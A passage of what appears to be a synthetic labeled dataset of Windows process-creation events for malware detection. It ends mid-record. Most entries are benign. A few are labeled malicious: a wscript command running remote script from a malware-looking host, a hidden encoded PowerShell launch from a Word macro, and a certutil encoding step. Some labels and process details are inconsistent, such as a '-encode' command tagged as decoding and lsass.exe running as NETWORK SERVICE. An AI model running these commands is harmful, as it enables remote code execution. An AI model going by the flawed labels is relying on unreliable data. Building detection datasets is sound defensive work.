  {
    "UtcTime": "2024-07-02T04:30:35.202Z",
    "ProcessGuid": "{84FF6A84-BB6A-4B6C-8144-A40F8F47F9F8}",
    "ProcessId": 32972,
    "Image": "C:\\Windows\\System32\\fontdrvhost.exe",
    "CommandLine": "fontdrvhost.exe",
    "ParentImage": "C:\\Windows\\System32\\smss.exe",
    "ParentCommandLine": "smss.exe",
    "ParentProcessId": 26907,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T23:06:20.437Z",
    "ProcessGuid": "{33F17ADE-ED3F-4A6C-B131-8E99403F36F7}",
    "ProcessId": 21481,
    "Image": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
    "CommandLine": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 44588,
    "User": "NT AUTHORITY\\LOCAL SERVICE",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T13:23:06.093Z",
    "ProcessGuid": "{D5FC9BE1-3BC2-4492-A4CC-8117A2AF4060}",
    "ProcessId": 1340,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c netstat -an",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 62797,
    "User": "CORP\\sysadmin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T14:32:06.572Z",
    "ProcessGuid": "{9A2BAB32-9AC6-4F5E-B6DE-430A2064AD06}",
    "ProcessId": 5743,
    "Image": "C:\\Program Files\\Adobe\\Acrobat DC\\Acrobat\\Acrobat.exe",
    "CommandLine": "Acrobat.exe C:\\Users\\pchen\\Documents\\report.pdf",
    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
    "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\"",
    "ParentProcessId": 33975,
    "User": "CORP\\pchen",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T08:42:52.567Z",
    "ProcessGuid": "{7AA6ED77-9C08-4D69-9F4F-1270D1A2B68B}",
    "ProcessId": 20620,
    "Image": "C:\\Windows\\explorer.exe",
    "CommandLine": "explorer.exe C:\\Users\\pchen\\Documents",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 62063,
    "User": "CORP\\pchen",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T13:27:07.632Z",
    "ProcessGuid": "{BE1DE1B5-E8DF-4278-8EDB-3E3BA0594D8F}",
    "ProcessId": 15856,
    "Image": "C:\\Windows\\System32\\rundll32.exe",
    "CommandLine": "rundll32.exe shell32.dll,SHCreateLocalServerRunDll {GUID}",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 8909,
    "User": "CORP\\jsmith",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-04T13:17:13.773Z",
    "ProcessGuid": "{2B637E83-C63C-4D5C-B5AC-24D10A3BD776}",
    "ProcessId": 34577,
    "Image": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
    "CommandLine": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 8459,
    "User": "NT AUTHORITY\\NETWORK SERVICE",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T18:32:05.227Z",
    "ProcessGuid": "{F094D192-63A8-4A2B-8EF5-2E6775EA6728}",
    "ProcessId": 29307,
    "Image": "C:\\Windows\\System32\\winlogon.exe",
    "CommandLine": "winlogon.exe",
    "ParentImage": "C:\\Windows\\System32\\smss.exe",
    "ParentCommandLine": "smss.exe",
    "ParentProcessId": 19991,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T21:13:07.241Z",
    "ProcessGuid": "{7703DE21-91DC-4F46-8797-554848DDA4D5}",
    "ProcessId": 42478,
    "Image": "C:\\Windows\\System32\\taskeng.exe",
    "CommandLine": "taskeng.exe {GUID} S",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s Schedule",
    "ParentProcessId": 29453,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T21:53:46.862Z",
    "ProcessGuid": "{F02C0592-5EED-496B-8502-07511D2BEBE0}",
    "ProcessId": 10211,
    "Image": "C:\\Windows\\System32\\wscript.exe",
    "CommandLine": "wscript.exe //e:jscript http://malware-cdn5153.top/script923.js",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe /c",
    "ParentProcessId": 16469,
    "User": "CORP\\klee",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1059.005",
    "technique_name": "WScript Remote Script",
    "label": "malicious"
  },
  {
    "UtcTime": "2024-07-02T14:52:13.506Z",
    "ProcessGuid": "{C5FEFCDA-4513-4DF9-B67E-2EEDDD718A33}",
    "ProcessId": 18598,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -NoProfile -Command \"Get-Service | Where-Object {$_.Status -eq 'Running'}\"",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\cmd.exe",
    "ParentProcessId": 22159,
    "User": "CORP\\agarwal",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T16:41:11.040Z",
    "ProcessGuid": "{652D61DF-16C8-49DE-8ABA-A67718DF291F}",
    "ProcessId": 17236,
    "Image": "C:\\Windows\\System32\\lsass.exe",
    "CommandLine": "C:\\Windows\\System32\\lsass.exe",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 47374,
    "User": "NT AUTHORITY\\NETWORK SERVICE",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T10:00:20.252Z",
    "ProcessGuid": "{E6EF2C17-8C8D-47EF-911D-073629F709A7}",
    "ProcessId": 52489,
    "Image": "C:\\Windows\\System32\\perfmon.exe",
    "CommandLine": "perfmon.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 15517,
    "User": "CORP\\sysadmin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T23:46:47.900Z",
    "ProcessGuid": "{437D7BA1-7A4A-4BFA-9DB2-1EFFA80E79FE}",
    "ProcessId": 9257,
    "Image": "C:\\Windows\\System32\\bitsadmin.exe",
    "CommandLine": "bitsadmin.exe /transfer wsus_update /download /priority normal http://internal-wsus.corp.local/update_kb6611860.cab C:\\Windows\\SoftwareDistribution\\Download\\update_kb6611860.cab",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s BITS",
    "ParentProcessId": 35109,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-05T03:46:03.861Z",
    "ProcessGuid": "{3FD44378-3482-42EE-9061-534340A80DF7}",
    "ProcessId": 25443,
    "Image": "C:\\Windows\\System32\\bitsadmin.exe",
    "CommandLine": "bitsadmin.exe /transfer wsus_update /download /priority normal http://sccm01.corp.local/update_kb8092498.cab C:\\Windows\\SoftwareDistribution\\Download\\update_kb8092498.cab",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s BITS",
    "ParentProcessId": 18023,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "gray_area"
  },
  {
    "UtcTime": "2024-07-03T11:09:11.161Z",
    "ProcessGuid": "{E21E35A3-6419-4842-AC62-BCE56F59475A}",
    "ProcessId": 24738,
    "Image": "C:\\Program Files\\Adobe\\Acrobat DC\\Acrobat\\Acrobat.exe",
    "CommandLine": "Acrobat.exe C:\\Users\\dbadmin\\Documents\\report.pdf",
    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
    "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\"",
    "ParentProcessId": 40454,
    "User": "CORP\\dbadmin",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T10:21:57.402Z",
    "ProcessGuid": "{5997840A-F2E2-456D-A329-29442FBD9891}",
    "ProcessId": 44052,
    "Image": "C:\\Program Files\\Docker\\Docker\\resources\\bin\\docker.exe",
    "CommandLine": "docker.exe ps -a",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "cmd.exe",
    "ParentProcessId": 9995,
    "User": "CORP\\mjones",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T06:39:18.710Z",
    "ProcessGuid": "{47449D55-40ED-4A1B-892F-0414DD210345}",
    "ProcessId": 61062,
    "Image": "C:\\Windows\\System32\\spoolsv.exe",
    "CommandLine": "C:\\Windows\\System32\\spoolsv.exe",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 33191,
    "User": "NT AUTHORITY\\NETWORK SERVICE",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T13:38:44.205Z",
    "ProcessGuid": "{63FE433F-2E6F-4BFB-8C7B-A4075FC15C68}",
    "ProcessId": 32392,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -NoProfile -Command \"Install-Module -Name Az -AllowClobber -Force\"",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 21590,
    "User": "CORP\\agarwal",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T10:41:53.420Z",
    "ProcessGuid": "{FA52D96A-9769-4F0D-8A72-80B75BA44945}",
    "ProcessId": 2471,
    "Image": "C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe",
    "CommandLine": "OneDrive.exe /sync",
    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\POWERPNT.EXE",
    "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\POWERPNT.EXE\"",
    "ParentProcessId": 16969,
    "User": "CORP\\klee",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T12:29:40.979Z",
    "ProcessGuid": "{AD7D4C9B-D468-47DC-848B-9769F77DDFBD}",
    "ProcessId": 10492,
    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    "CommandLine": "chrome.exe --type=renderer --field-trial-handle=12345",
    "ParentImage": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    "ParentCommandLine": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\"",
    "ParentProcessId": 57902,
    "User": "CORP\\analyst02",
    "IntegrityLevel": "Low",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T15:02:40.396Z",
    "ProcessGuid": "{6808A20D-8818-452D-AB34-92BD4FCB74E5}",
    "ProcessId": 65293,
    "Image": "C:\\Windows\\System32\\taskhostw.exe",
    "CommandLine": "taskhostw.exe",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 25464,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T20:43:44.704Z",
    "ProcessGuid": "{17BC1B3D-C560-4CF4-9B13-73AD56C099CB}",
    "ProcessId": 24758,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c powershell -noni -nop -w hidden -enc QQBkAGQALQBUAHkAcABlACAALQBBAHMAcwBlAG0AYgBsAHkATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4ARAByAGEAdwBpAG4AZwA7ACQAZwA9AFsARAByAGEAdwBpAG4AZwAuAEIAaQB0AG0AYQBwAF0AOgA6AG4AZQB3ACgAJAB1ACkA",
    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
    "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n document42.docm",
    "ParentProcessId": 7280,
    "User": "CORP\\mjones",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1204.002",
    "technique_name": "Office Macro Execution",
    "label": "malicious"
  },
  {
    "UtcTime": "2024-07-05T12:20:54.251Z",
    "ProcessGuid": "{3E5DF14E-7C34-47A0-9D2E-B9D5FBCB507A}",
    "ProcessId": 55442,
    "Image": "C:\\Program Files\\Microsoft VS Code\\Code.exe",
    "CommandLine": "Code.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 62251,
    "User": "CORP\\helpdesk",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T09:15:12.194Z",
    "ProcessGuid": "{F12C5626-1212-4A3D-8497-AF5D49A34C3F}",
    "ProcessId": 36146,
    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    "CommandLine": "chrome.exe --no-first-run",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 30400,
    "User": "CORP\\agarwal",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T14:28:44.608Z",
    "ProcessGuid": "{4B075786-4BD0-4F29-BA81-DB53C61B5F45}",
    "ProcessId": 31796,
    "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
    "CommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\"",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 20087,
    "User": "CORP\\dbadmin",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T12:44:37.156Z",
    "ProcessGuid": "{FBDD4AF9-43D5-4D94-A268-A71812BDA722}",
    "ProcessId": 38064,
    "Image": "C:\\Windows\\System32\\resmon.exe",
    "CommandLine": "resmon.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 38149,
    "User": "CORP\\sysadmin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T10:00:47.345Z",
    "ProcessGuid": "{AEBA129C-6DDD-4566-A340-9BE99270674F}",
    "ProcessId": 52823,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c tracert 8.8.8.8",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 20334,
    "User": "CORP\\admin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T17:38:03.316Z",
    "ProcessGuid": "{5E210C65-5C23-4379-81D2-DFBE2BBBC326}",
    "ProcessId": 44652,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -NoProfile -Command \"Get-Service | Where-Object {$_.Status -eq 'Running'}\"",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 49607,
    "User": "CORP\\jsmith",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T13:53:40.987Z",
    "ProcessGuid": "{A13A3E68-F856-43F0-8D90-90B25FE79E66}",
    "ProcessId": 53423,
    "Image": "C:\\Users\\admin\\Downloads\\installer.exe",
    "CommandLine": "installer.exe --silent --accept-license",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 20135,
    "User": "CORP\\admin",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T12:00:49.440Z",
    "ProcessGuid": "{27D341C0-1FC8-4A73-A4D0-92BC76ED1F73}",
    "ProcessId": 53295,
    "Image": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
    "CommandLine": "msedge.exe --type=gpu-process",
    "ParentImage": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
    "ParentCommandLine": "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\"",
    "ParentProcessId": 20196,
    "User": "CORP\\helpdesk",
    "IntegrityLevel": "Low",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T05:28:02.269Z",
    "ProcessGuid": "{F5D1103E-70A2-4EC3-9FDC-7E5C4ABFA93C}",
    "ProcessId": 29818,
    "Image": "C:\\Windows\\System32\\UsoClient.exe",
    "CommandLine": "UsoClient.exe StartInteractiveScan",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
    "ParentProcessId": 31478,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T07:36:26.191Z",
    "ProcessGuid": "{57D79216-DEE5-48ED-9C46-0F8B7547FA21}",
    "ProcessId": 44540,
    "Image": "C:\\Windows\\System32\\svchost.exe",
    "CommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 44792,
    "User": "NT AUTHORITY\\NETWORK SERVICE",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T14:23:57.391Z",
    "ProcessGuid": "{3223D59D-1387-44ED-B2D1-F9F9233AEE7C}",
    "ProcessId": 30395,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c systeminfo",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 57991,
    "User": "CORP\\itops",
    "IntegrityLevel": "High",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T11:24:36.033Z",
    "ProcessGuid": "{87495DAD-6AD8-4D3A-91E7-5DF040A22139}",
    "ProcessId": 40655,
    "Image": "C:\\Windows\\System32\\svchost.exe",
    "CommandLine": "C:\\Windows\\System32\\svchost.exe -k DcomLaunch -p",
    "ParentImage": "C:\\Windows\\System32\\services.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
    "ParentProcessId": 11055,
    "User": "NT AUTHORITY\\NETWORK SERVICE",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T17:43:34.388Z",
    "ProcessGuid": "{4A2DE5F4-FE96-45F3-B4A7-11E66CE87092}",
    "ProcessId": 59704,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c dir C:\\Users",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 65235,
    "User": "CORP\\pchen",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-03T10:17:12.959Z",
    "ProcessGuid": "{42477FDD-6395-418D-BB96-823BE4233D0A}",
    "ProcessId": 58357,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c whoami",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 48515,
    "User": "CORP\\helpdesk",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-05T03:06:46.236Z",
    "ProcessGuid": "{BD04DCEE-433D-4CBA-AA83-472041F99DB1}",
    "ProcessId": 35842,
    "Image": "C:\\Windows\\System32\\schtasks.exe",
    "CommandLine": "schtasks.exe /run /tn \"\\Microsoft\\Windows\\WindowsUpdate\\Automatic App Update\"",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s Schedule",
    "ParentProcessId": 26253,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T13:13:43.649Z",
    "ProcessGuid": "{57993C8D-769A-46E1-ADF2-098837DC5963}",
    "ProcessId": 56896,
    "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
    "CommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\"",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 18300,
    "User": "CORP\\pchen",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T19:53:01.636Z",
    "ProcessGuid": "{3CC087CC-363D-44F9-A245-2168AD05D19A}",
    "ProcessId": 10986,
    "Image": "C:\\Program Files\\Zoom\\bin\\Zoom.exe",
    "CommandLine": "Zoom.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 16633,
    "User": "CORP\\jsmith",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T19:05:20.727Z",
    "ProcessGuid": "{98EAB616-86CE-4653-A2FA-C595CE2D19A9}",
    "ProcessId": 35761,
    "Image": "C:\\Windows\\System32\\certutil.exe",
    "CommandLine": "certutil.exe -encode C:\\Users\\Public\\decoded773.exe C:\\Users\\Public\\encoded9267.txt",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentCommandLine": "powershell.exe",
    "ParentProcessId": 29372,
    "User": "CORP\\klee",
    "IntegrityLevel": "Medium",
    "is_malicious": 1,
    "mitre_technique_id": "T1140",
    "technique_name": "Certutil Base64 Decode",
    "label": "malicious"
  },
  {
    "UtcTime": "2024-07-03T14:46:54.244Z",
    "ProcessGuid": "{DE23CDBF-C6FE-452A-BA95-7E57516F0887}",
    "ProcessId": 4794,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -NoProfile -Command \"Restart-Service -Name Spooler -Force\"",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 17022,
    "User": "CORP\\mjones",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-04T09:56:29.886Z",
    "ProcessGuid": "{5F975B3D-C3CF-4E96-8E8A-880CDAB41EDB}",
    "ProcessId": 19501,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -NoProfile -Command \"Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\"",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentProcessId": 51693,
    "User": "CORP\\agarwal",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-01T05:50:17.598Z",
    "ProcessGuid": "{AB1F101D-2437-4681-837E-9FC5FE6E4B54}",
    "ProcessId": 8841,
    "Image": "C:\\Windows\\System32\\taskeng.exe",
    "CommandLine": "taskeng.exe {GUID} S",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s Schedule",
    "ParentProcessId": 26939,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T22:34:50.109Z",
    "ProcessGuid": "{34905A69-023C-4A5B-8CCE-0B390F648535}",
    "ProcessId": 9246,
    "Image": "C:\\Windows\\System32\\taskeng.exe",
    "CommandLine": "taskeng.exe {GUID} S",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s Schedule",
    "ParentProcessId": 32971,
    "User": "NT AUTHORITY\\SYSTEM",
    "IntegrityLevel": "System",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T20:07:56.109Z",
    "ProcessGuid": "{E683C079-8FDB-4D0A-9581-71471D1F6EE6}",
    "ProcessId": 49655,
    "Image": "C:\\Program Files\\Zoom\\bin\\Zoom.exe",
    "CommandLine": "Zoom.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentCommandLine": "C:\\Windows\\explorer.exe /factory,{GUID}",
    "ParentProcessId": 37256,
    "User": "CORP\\agarwal",
    "IntegrityLevel": "Medium",
    "is_malicious": 0,
    "mitre_technique_id": "",
    "technique_name": "",
    "label": "benign"
  },
  {
    "UtcTime": "2024-07-02T23:02:12.471Z",
    "ProcessGuid": "{AD9D3B62-14A9-438E-872B-E2063F29B6BA}",
    "ProcessId": 49190,
